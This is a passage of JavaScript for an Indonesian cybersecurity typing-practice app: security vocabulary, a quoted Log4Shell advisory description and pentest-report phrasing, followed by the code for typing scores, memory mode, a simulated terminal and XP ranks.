# Attack Types
Reconnaissance   : pengintaian sebelum serangan
Enumeration      : pencacahan/pemetaan sistem target
Exploitation     : eksploitasi kerentanan
Persistence      : mempertahankan akses
Privilege Escalation : eskalasi hak akses
Lateral Movement : pergerakan ke sistem lain
Exfiltration     : pencurian/pengiriman data keluar

# Defense Terms
Vulnerability    : kerentanan/celah keamanan
Patch            : pembaruan keamanan
Hardening        : penguatan konfigurasi sistem
Mitigation       : tindakan mengurangi risiko
Remediation      : perbaikan/penanganan insiden
IOC (Indicator of Compromise) : bukti sistem dikompromis
TTPs (Tactics, Techniques, Procedures) : cara kerja attacker

# Report Vocabulary
Severity         : tingkat keparahan (Critical/High/Medium/Low)
Impact           : dampak jika dieksploitasi
Likelihood       : kemungkinan terjadi
Proof of Concept : bukti bahwa kerentanan bisa dieksploitasi
Remediation Steps: langkah perbaikan yang disarankan`,
      explanation:'Penguasaan vocabulary ini penting untuk: membaca CVE/advisory, menulis laporan pentest, berkomunikasi dengan tim internasional, dan mengikuti sertifikasi berbahasa Inggris.',
      simulation:['[Vocab Quiz] What is "Enumeration"?','→ The process of extracting information from a target system','[Vocab Quiz] What does IOC stand for?','→ Indicator of Compromise','[Score] 8/10 — Great job! Keep practicing.'],
      xp:30, helper:'security'
    }),
    () => ({
      type:'concept', title:'Membaca CVE & Security Advisory',
      desc:'Cara membaca dan memahami CVE report dan security advisory dalam bahasa Inggris.',
      code:`# CONTOH CVE — CVE-2021-44228 (Log4Shell)

# HEADER
CVE ID     : CVE-2021-44228
Published  : 2021-12-10
Severity   : CRITICAL (CVSS 10.0)
Affected   : Apache Log4j 2.0-beta9 to 2.14.1

# DESCRIPTION (bahasa teknis)
"Apache Log4j2 2.0-beta9 through 2.14.1 JNDI features
used in configuration, log messages, and parameters do
not protect against attacker-controlled LDAP and other
JNDI related endpoints. An attacker who can control log
messages or parameters can execute arbitrary code loaded
from LDAP servers when message lookup substitution is
enabled."

# KOSAKATA PENTING
arbitrary code execution : eksekusi kode sembarangan
attacker-controlled     : dikendalikan penyerang
vulnerable              : rentan/memiliki kelemahan
patched version         : versi yang sudah diperbaiki
workaround              : solusi sementara
affected versions       : versi yang terdampak
proof of concept (PoC)  : bukti konsep eksploitasi
disclosure date         : tanggal pengumuman publik
CVSS score              : skor tingkat keparahan (0-10)`,
      explanation:'Membaca CVE adalah keahlian dasar SOC analyst dan pentest. Fokus pada: affected versions, attack vector, dan recommended fix. Vocabulary teknis CVE sangat terbatas dan berulang — cepat hafal.',
      simulation:['[NVD] Searching CVE-2021-44228...','CVSS Score: 10.0 — CRITICAL','Attack Vector: Network','Privileges Required: None','User Interaction: None','[!] Your system: Log4j 2.12.0 — VULNERABLE','[Fix] Update to Log4j 2.17.1 immediately'],
      xp:40, helper:'security'
    }),
    () => ({
      type:'concept', title:'Pentest Report Writing in English',
      desc:'Kalimat dan frasa standar untuk menulis laporan penetration testing dalam bahasa Inggris.',
      code:`# PENTEST REPORT — STANDARD PHRASES

# ══ EXECUTIVE SUMMARY ══
"During the assessment period of [date], [Company] 
engaged [Your Name] to conduct a penetration test..."

"The assessment identified [N] critical, [N] high, 
[N] medium, and [N] low severity vulnerabilities."

"Immediate remediation is recommended for critical findings."

# ══ VULNERABILITY DESCRIPTION ══
"A SQL injection vulnerability was identified in the 
login endpoint at /api/auth/login."

"The application fails to properly sanitize user-supplied 
input before incorporating it into database queries."

"An attacker could exploit this vulnerability to..."
  → "extract sensitive data from the database"
  → "bypass authentication mechanisms"
  → "execute arbitrary commands on the server"

# ══ IMPACT ══
"Successful exploitation of this vulnerability would allow..."
"This issue poses a significant risk to..."
"The confidentiality and integrity of [data] may be compromised."

# ══ RECOMMENDATION ══
"It is recommended to implement parameterized queries."
"The vendor has released a patch in version X.Y.Z."
"Apply the principle of least privilege to..."`,
      explanation:'Laporan pentest yang baik adalah campuran teknis dan bisnis. Executive summary untuk C-level, technical findings untuk developer. Kalimat standar ini dipakai di semua laporan profesional.',
      simulation:['[Report Draft] Section: Critical Findings','Finding #1: SQL Injection (CVSS 9.8)','→ Description: written ✓','→ PoC: attached ✓','→ Impact: defined ✓','→ Remediation: clear steps ✓','[Client] Report approved — invoice sent'],
      xp:50, helper:'security'
    }),
  ],
};

// ================================================================
// SYNTAX HELPERS per topik
// ================================================================
const CY_TOPIC_HELPERS = {
  networking: CY_HELPERS.networking,
  os: CY_HELPERS.networking,
  scripting: CY_HELPERS.scripting,
  concepts: CY_HELPERS.security,
  tools: CY_HELPERS.security,
  platforms: CY_HELPERS.security,
  offensive: CY_HELPERS.security,
  defensive: CY_HELPERS.scripting,
  cloud: CY_HELPERS.security,
  appsec: CY_HELPERS.webpentest,
  malware: CY_HELPERS.security,
  exploit: CY_HELPERS.scripting,
  bugbounty: CY_HELPERS.webpentest,
  threatmodel: CY_HELPERS.security,
  reputation: CY_HELPERS.security,
  homelab: CY_HELPERS.networking,
  english: CY_HELPERS.security,
};

// ================================================================
// STATE
// ================================================================
let cyState = {
  topic: 'networking',
  mode: 'practice',
  type: 'all',
  challenge: null,
  input: '',
  startTime: null,
  mistakes: 0,
  completed: 0,
  bestWpm: 0,
  mastery: {},         // { topicId: { done: n, total: n } }
  memPhase: false,
  memTimer: null,
  challengeCount: 0,
};

// XP / Rank system
const CY_RANKS = [
  { min:0,    label:'Script Kiddie'     },
  { min:300,  label:'Beginner Hacker'   },
  { min:800,  label:'Security Student'  },
  { min:1600, label:'Analyst'           },
  { min:2800, label:'Penetration Tester'},
  { min:4500, label:'Red Team Operator' },
  { min:7000, label:'Security Engineer' },
  { min:10000,label:'Elite Hacker'      },
];

// ================================================================
// INIT
// ================================================================
function cyInit() {
  // Pastikan inject sudah jalan (fallback jika DOMContentLoaded terlewat)
  injectCyberCSS();
  injectCyberPage();

  cyBuildTopicTabs();
  cyLoadMastery();
  cyNewChallenge();
  cyUpdateHeader();
  cyUpdateHelperPanel();
  console.log('CyberTrainer: Init ✓');
}

function cyBuildTopicTabs() {
  const container = document.getElementById('cy-topic-tabs');
  if (!container) return;
  container.innerHTML = '';
  CY_TOPICS.forEach(t => {
    const btn = document.createElement('button');
    btn.className = 'cy-topic-btn' + (t.id === cyState.topic ? ' active' : '');
    btn.textContent = t.label;
    btn.onclick = () => cySetTopic(t.id, btn);
    container.appendChild(btn);
  });
}

// ================================================================
// SETTERS
// ================================================================
function cySetTopic(id, btn) {
  cyState.topic = id;
  document.querySelectorAll('.cy-topic-btn').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  const topic = CY_TOPICS.find(t => t.id === id);
  if (topic) {
    const stagePill = document.getElementById('cy-stage-pill');
    if (stagePill) stagePill.textContent = topic.stage;
  }
  cyUpdateHelperPanel();
  cyNewChallenge();
}

function cySetMode(mode, btn) {
  cyState.mode = mode;
  document.querySelectorAll('#cy-mode-tabs .cy-seg').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  const info = {
    practice: { icon:'📖', title:'Practice Mode',  desc:'Ketik command/script sambil melihat referensi. Pelajari syntax security tools.' },
    memory:   { icon:'🧠', title:'Memory Mode',    desc:'Pelajari command, sembunyikan, lalu ketik dari ingatan.' },
    speed:    { icon:'⚡', title:'Speed Mode',     desc:'Ketik secepat mungkin. Latih muscle memory untuk command.' },
    exam:     { icon:'🏆', title:'Exam Mode',      desc:'Tanpa hint, tanpa referensi. Uji kemampuanmu.' },
  }[mode];
  if (info) {
    document.getElementById('cy-mode-icon').textContent = info.icon;
    document.getElementById('cy-mode-title').textContent = info.title;
    document.getElementById('cy-mode-desc').textContent  = info.desc;
  }
  cyNewChallenge();
}

function cySetType(type, btn) {
  cyState.type = type;
  document.querySelectorAll('#cy-type-tabs .cy-seg').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  cyNewChallenge();
}

// ================================================================
// CHALLENGE GENERATION
// ================================================================
function cyNewChallenge() {
  clearTimeout(cyState.memTimer);
  cyState.memPhase = false;
  cyState.mistakes = 0;
  cyState.startTime = null;
  cyState.input = '';

  const generators = CY_GENERATORS[cyState.topic] || CY_GENERATORS.networking;
  let pool = generators;

  // Filter by type if not 'all'
  if (cyState.type !== 'all') {
    const filtered = generators.filter(g => {
      const ch = g();
      return ch.type === cyState.type;
    });
    if (filtered.length > 0) pool = filtered;
  }

  const gen = pool[Math.floor(Math.random() * pool.length)];
  cyState.challenge = gen();
  cyState.challengeCount++;

  // Update UI
  const topicInfo = CY_TOPICS.find(t => t.id === cyState.topic);
  const el = (id) => document.getElementById(id);

  el('cy-challenge-num').textContent = '#' + cyState.challengeCount;
  el('cy-challenge-title').textContent = cyState.challenge.title;
  el('cy-challenge-desc').textContent  = cyState.challenge.desc;
  el('cy-stage-badge').textContent = topicInfo ? topicInfo.stage : '';
  el('cy-type-badge').textContent  = cyState.challenge.type;
  el('cy-topic-tag').textContent   = topicInfo ? topicInfo.label : '';

  // Input reset
  const input = el('cy-input');
  if (input) { input.value = ''; input.disabled = false; input.focus(); }

  el('cy-result-bar').style.display = 'none';
  el('cy-mistake-count').textContent = '0';
  el('cy-stat-wpm').textContent = '0';
  el('cy-stat-acc').textContent = '100%';
  el('cy-stat-prog').textContent = '0%';

  // Mode-based display
  if (cyState.mode === 'memory') {
    cyShowMemorizePhase();
  } else {
    el('cy-memorize-phase').style.display = 'none';
    el('cy-split-screen').style.display   = '';
    const refWrap = el('cy-reference-wrap');
    if (refWrap) refWrap.style.display = (cyState.mode === 'exam') ? 'none' : '';
    cyRenderRef();
    cyRenderTypingDisplay('');
  }

  cyUpdateSyntaxPanel();
  cyClearTerminal();
  cyUpdateHelperPanel();
}

// ================================================================
// REFERENCE DISPLAY
// ================================================================
function cyRenderRef() {
  const el = document.getElementById('cy-ref-code');
  if (!el || !cyState.challenge) return;
  el.innerHTML = cyHighlight(cyState.challenge.code);
}

function cyHighlight(code) {
  if (!code) return '';
  return code
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
    .replace(/(#[^\n]*)/g, '<span style="color:#6a9955">$1</span>')
    .replace(/\b(nmap|hashcat|john|sqlmap|nikto|burpsuite|metasploit|msfconsole|wireshark|tcpdump|subfinder|gobuster|ffuf|hydra|netcat|nc|curl|wget|ssh|sudo|chmod|find|grep|awk|sed|python3|python|bash|import|def|class|return|if|else|for|while|with|as|from|try|except|print|True|False|None)\b/g,
      '<span style="color:#569cd6">$1</span>')
    .replace(/("[^"]*"|\'[^\']*\')/g, '<span style="color:#ce9178">$1</span>')
    .replace(/\b(\d+\.?\d*)\b/g, '<span style="color:#b5cea8">$1</span>')
    .replace(/\n/g, '<br>');
}

// ================================================================
// TYPING DISPLAY
// ================================================================
function cyRenderTypingDisplay(typed) {
  const el = document.getElementById('cy-typing-display');
  if (!el || !cyState.challenge) return;

  const target = cyState.challenge.code;
  let html = '';
  for (let i = 0; i < target.length; i++) {
    const ch = target[i] === '\n' ? '↵\n' : target[i];
    if (i < typed.length) {
      html += typed[i] === target[i]
        ? `<span class="char correct">${ch === ' ' ? '&nbsp;' : ch.replace('<','&lt;').replace('>','&gt;')}</span>`
        : `<span class="char wrong">${ch === ' ' ? '&nbsp;' : ch.replace('<','&lt;').replace('>','&gt;')}</span>`;
    } else if (i === typed.length) {
      html += `<span class="char current">${ch === ' ' ? '&nbsp;' : ch.replace('<','&lt;').replace('>','&gt;')}</span>`;
    } else {
      html += `<span class="char pending">${ch === ' ' ? '&nbsp;' : ch.replace('<','&lt;').replace('>','&gt;')}</span>`;
    }
  }
  el.innerHTML = html;
}

// ================================================================
// INPUT HANDLING
// ================================================================
function cyHandleInput() {
  const inputEl = document.getElementById('cy-input');
  if (!inputEl || !cyState.challenge) return;

  const typed = inputEl.value;
  const target = cyState.challenge.code;
  cyState.input = typed;

  if (!cyState.startTime && typed.length > 0) cyState.startTime = Date.now();

  // Count mistakes
  let mistakes = 0;
  for (let i = 0; i < typed.length; i++) {
    if (typed[i] !== target[i]) mistakes++;
  }
  cyState.mistakes = mistakes;
  document.getElementById('cy-mistake-count').textContent = mistakes;

  // Update display
  cyRenderTypingDisplay(typed);

  // Live stats
  if (cyState.startTime) {
    const elapsed = (Date.now() - cyState.startTime) / 1000 / 60;
    const words = typed.length / 5;
    const wpm = elapsed > 0 ? Math.round(words / elapsed) : 0;
    const acc = typed.length > 0 ? Math.round(((typed.length - mistakes) / typed.length) * 100) : 100;
    const prog = Math.round((typed.length / target.length) * 100);

    document.getElementById('cy-stat-wpm').textContent  = wpm;
    document.getElementById('cy-stat-acc').textContent  = acc + '%';
    document.getElementById('cy-stat-prog').textContent = Math.min(prog, 100) + '%';
  }

  // Auto check on completion
  if (typed.length >= target.length) {
    cyCheckAnswer();
  }
}

function cyHandleKeydown(e) {
  if (e.key === 'Tab') { e.preventDefault(); }
}

// ================================================================
// CHECK ANSWER
// ================================================================
function cyCheckAnswer() {
  const inputEl = document.getElementById('cy-input');
  if (!inputEl || !cyState.challenge) return;

  const typed  = inputEl.value;
  const target = cyState.challenge.code;
  const elapsed = cyState.startTime ? (Date.now() - cyState.startTime) / 1000 : 1;

  let correct = 0;
  for (let i = 0; i < Math.min(typed.length, target.length); i++) {
    if (typed[i] === target[i]) correct++;
  }

  const acc   = target.length > 0 ? Math.round((correct / target.length) * 100) : 0;
  const wpm   = Math.round((target.length / 5) / (elapsed / 60));
  const score = Math.round((acc * 0.6) + (Math.min(wpm, 100) * 0.4));

  if (wpm > cyState.bestWpm) cyState.bestWpm = wpm;
  cyState.completed++;
  document.getElementById('cy-challenges-done').textContent = cyState.completed;
  document.getElementById('cy-best-wpm').textContent = cyState.bestWpm;

  // Show result
  document.getElementById('cy-res-score').textContent = score + '%';
  document.getElementById('cy-res-wpm').textContent   = wpm;
  document.getElementById('cy-res-acc').textContent   = acc + '%';
  document.getElementById('cy-res-time').textContent  = Math.round(elapsed) + 's';
  document.getElementById('cy-result-bar').style.display = '';

  // Update mastery
  cyUpdateMastery(cyState.topic, score);

  // XP award
  const xpEarned = Math.round((cyState.challenge.xp || 50) * (score / 100));
  cyAwardXP(xpEarned);

  // Run simulation
  cyRunSimulation();

  inputEl.disabled = true;
}

// ================================================================
// MEMORY MODE
// ================================================================
function cyShowMemorizePhase() {
  const el = id => document.getElementById(id);
  el('cy-memorize-phase').style.display = '';
  el('cy-split-screen').style.display   = 'none';
  el('cy-mem-code-display').innerHTML   = cyHighlight(cyState.challenge.code);
  el('cy-mem-progress-fill').style.width = '100%';

  let secs = 12;
  el('cy-mem-countdown').textContent = secs;
  const interval = 50;
  const total = secs * 1000;
  let elapsed = 0;

  cyState.memTimer = setInterval(() => {
    elapsed += interval;
    const remaining = total - elapsed;
    el('cy-mem-countdown').textContent = Math.ceil(remaining / 1000);
    el('cy-mem-progress-fill').style.width = ((remaining / total) * 100) + '%';
    if (elapsed >= total) {
      clearInterval(cyState.memTimer);
      cyStartMemoryRecall();
    }
  }, interval);
}

function cyStartMemoryRecall() {
  clearInterval(cyState.memTimer);
  const el = id => document.getElementById(id);
  el('cy-memorize-phase').style.display = 'none';
  el('cy-split-screen').style.display   = '';
  el('cy-reference-wrap').style.display = 'none';
  cyState.memPhase = true;
  el('cy-typing-label').textContent = '🧠 Ketik dari ingatan...';
  el('cy-input').focus();
  cyRenderTypingDisplay('');
}

// ================================================================
// TERMINAL SIMULATION
// ================================================================
function cyRunSimulation() {
  if (!cyState.challenge || !cyState.challenge.simulation) return;
  cyClearTerminal();
  const lines = cyState.challenge.simulation;
  const terminal = document.getElementById('cy-terminal');
  const topicInfo = CY_TOPICS.find(t => t.id === cyState.topic);

  lines.forEach((line, i) => {
    setTimeout(() => {
      if (!terminal) return;
      const div = document.createElement('div');
      div.className = 'cy-term-line';
      const isError   = line.includes('[!]') || line.includes('CRITICAL') || line.includes('VULNERABLE');
      const isSuccess = line.includes('[+]') || line.includes('OPEN') || line.includes('Found') || line.includes('earned');
      const isInfo    = line.includes('[*]') || line.includes('[');

      div.innerHTML = `<span class="cy-prompt">root@kali:~#</span> <span class="cy-term-text ${isError ? 'cy-err' : isSuccess ? 'cy-success' : isInfo ? 'cy-info' : ''}">${line.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</span>`;
      terminal.appendChild(div);
      terminal.scrollTop = terminal.scrollHeight;
    }, i * 300);
  });
}

function cyClearTerminal() {
  const t = document.getElementById('cy-terminal');
  if (t) t.innerHTML = '<div class="cy-term-line"><span class="cy-prompt">root@kali:~#</span> <span class="cy-term-text cy-dim">Ready. Pilih challenge dan klik Run...</span></div>';
}

// ================================================================
// SYNTAX PANEL & HELPER
// ================================================================
function cyUpdateSyntaxPanel() {
  const panel   = document.getElementById('cy-syntax-panel');
  const content = document.getElementById('cy-syntax-explain-content');
  if (!panel || !content || !cyState.challenge) return;
  if (cyState.challenge.explanation) {
    content.textContent = cyState.challenge.explanation;
    panel.style.display = '';
  } else {
    panel.style.display = 'none';
  }
}

function cyUpdateHelperPanel() {
  const content = document.getElementById('cy-syntax-helper-content');
  if (!content) return;
  const helpers = CY_TOPIC_HELPERS[cyState.topic] || CY_HELPERS.security;
  content.innerHTML = helpers.map(h => `
    <div class="cy-helper-item">
      <div class="cy-helper-token">${h.token}</div>
      <div class="cy-helper-desc">${h.desc}</div>
    </div>
  `).join('');
}

function cyToggleHint() {
  const panel = document.getElementById('cy-syntax-panel');
  if (panel) panel.style.display = panel.style.display === 'none' ? '' : 'none';
}

// ================================================================
// MASTERY
// ================================================================
function cyUpdateMastery(topicId, score) {
  if (!cyState.mastery[topicId]) cyState.mastery[topicId] = { done:0, total:0, totalScore:0 };
  cyState.mastery[topicId].done++;
  cyState.mastery[topicId].total++;
  cyState.mastery[topicId].totalScore += score;
  cyUpdateMasteryBar();
  cyySaveMastery();
}

function cyUpdateMasteryBar() {
  const topicCount = CY_TOPICS.length;
  let doneTopics = 0;
  CY_TOPICS.forEach(t => {
    if (cyState.mastery[t.id] && cyState.mastery[t.id].done >= 3) doneTopics++;
  });
  const pct = Math.round((doneTopics / topicCount) * 100);
  const bar = document.getElementById('cy-mastery-bar-fill');
  const pctEl = document.getElementById('cy-mastery-pct');
  if (bar)   bar.style.width = pct + '%';
  if (pctEl) pctEl.textContent = pct;
}

// ================================================================
// ROADMAP OVERLAY
// ================================================================
function cyShowRoadmap() {
  const grid = document.getElementById('cy-roadmap-grid');
  if (!grid) return;

  let lastStage = '';
  grid.innerHTML = CY_TOPICS.map(t => {
    const m = cyState.mastery[t.id] || { done:0 };
    const done = m.done || 0;
    const pct  = Math.min(Math.round((done / 5) * 100), 100);
    let stageLabel = '';
    if (t.stage !== lastStage) {
      lastStage = t.stage;
      stageLabel = `<div class="cy-stage-label">${t.stage}</div>`;
    }
    return `${stageLabel}<div class="cy-roadmap-card ${pct >= 80 ? 'done' : ''}" onclick="cySetTopic('${t.id}');cyHideRoadmap()">
      <div class="rmc-num">#${t.num}</div>
      <div class="rmc-name">${t.label}</div>
      <div class="rmc-bar-wrap"><div class="rmc-bar" style="width:${pct}%"></div></div>
      <div class="rmc-pct">${done} completed · ${pct}%</div>
    </div>`;
  }).join('');

  document.getElementById('cy-roadmap-overlay').style.display = 'flex';
}

function cyHideRoadmap() {
  const el = document.getElementById('cy-roadmap-overlay');
  if (el) el.style.display = 'none';
}

// ================================================================
// XP / LEVEL SYSTEM
// ================================================================
function cyAwardXP(xp) {
  if (typeof userData !== 'undefined') {
    userData.xp = (userData.xp || 0) + xp;
    if (typeof saveUser === 'function') saveUser();
    if (typeof updateTopbar === 'function') updateTopbar();
  }
  cyUpdateHeader();
  cyTryToast(`+${xp} XP 🔐`);
}

function cyUpdateHeader() {
  const xp = (typeof userData !== 'undefined' ? (userData.xp || 0) : 0);
  const level = Math.floor(xp / 300) + 1;
  const rank = [...CY_RANKS].reverse().find(r => xp >= r.min) || CY_RANKS[0];
  const nextXp = level * 300;
  const curXp  = xp % 300;
  const pct = Math.round((curXp / 300) * 100);

  const el = id => document.getElementById(id);
  if (el('cy-xp-val'))   el('cy-xp-val').textContent   = xp;
  if (el('cy-level-val'))el('cy-level-val').textContent = level;
  if (el('cy-rank-label'))el('cy-rank-label').textContent = rank.label;
  if (el('cy-xp-bar'))   el('cy-xp-bar').style.width   = pct + '%';
  if (el('cy-xp-cur'))   el('cy-xp-cur').textContent   = curXp;
  if (el('cy-xp-nxt'))   el('cy-xp-nxt').textContent   = '300';
  if (el('cy-streak-val') && typeof userData !== 'undefined') {
    el('cy-streak-val').textContent = userData.streak || 0;
  }
}

// ================================================================
// MISC UTILS
// ================================================================
function cyCopyRef() {
  if (!cyState.challenge) return;
  navigator.clipboard.writeText(cyState.challenge.code).then(() => cyTryToast('📋 Copied!'));
}

function cyClearInput() {
  const el = document.getElementById('cy-input');
  if (el) { el.value = ''; el.disabled = false; el.focus(); }
  cyState.startTime = null;
  cyState.mistakes  = 0;
  document.getElementById('cy-result-bar').style.display = 'none';
  cyRenderTypingDisplay('');
}

function cyTryToast(msg) {
  if (typeof showToast === 'function') showToast('🔐', msg);
}

function cyySaveMastery() {
  try { localStorage.setItem('cy_mastery', JSON.stringify(cyState.mastery)); } catch(e) {}
}

function cyLoadMastery() {
  try {
    const saved = JSON.parse(localStorage.getItem('cy_mastery') || 'null');
    if (saved) { cyState.mastery = saved; cyUpdateMasteryBar(); }
  } catch(e) {}
}

// ================================================================
// AUTO INIT — patch navigate() langsung dari sini
// Tidak perlu modifikasi index.html
// ================================================================
document.addEventListener('DOMContentLoaded', () => {
  // 1. Inject CSS
  injectCyberCSS();

  // 2. Char styles untuk typing display
  if (!document.getElementById('cy-char-styles')) {
    const s = document.createElement('style');
    s.id = 'cy-char-styles';
    s.textContent = `
      .char{display:inline;font-family:var(--font-mono);white-space:pre-wrap}
      .char.correct{color:#5de0a0}
      .char.wrong{color:#f76a6a;background:rgba(247,106,106,.15);border-radius:2px}
      .char.current{color:var(--text);border-bottom:2px solid var(--green)}
      .char.pending{color:var(--text3)}
    `;
    document.head.appendChild(s);
  }

  // 3. Isi konten page-cybertrainer (sudah ada di HTML atau di-inject)
  injectCyberPage();

  // 4. Tambahkan 'cybertrainer' ke PAGE_TITLES jika belum ada
  if (typeof PAGE_TITLES !== 'undefined' && !PAGE_TITLES['cybertrainer']) {
    PAGE_TITLES['cybertrainer'] = 'Cyber Security Trainer';
  }

  // 5. Patch fungsi navigate() agar handle 'cybertrainer'
  //    Ini bekerja meski index.html tidak dimodifikasi
  if (typeof navigate === 'function' && !window._cyNavigatePatched) {
    window._cyNavigatePatched = true;
    const _origNav = navigate;
    window.navigate = function(page) {
      _origNav(page);
      if (page === 'cybertrainer') {
        setTimeout(() => cyInit(), 100);
      }
    };
    console.log('CyberTrainer: navigate() patched ✓');
  }

  // 6. Patch semua nav-item & mode-card yang onclick cybertrainer
  //    agar cyInit ikut terpanggil (fallback)
  document.querySelectorAll('[onclick*="cybertrainer"]').forEach(el => {
    el.addEventListener('click', () => setTimeout(() => cyInit(), 150));
  });
});

console.log('CyberTrainer: Module loaded ✓');
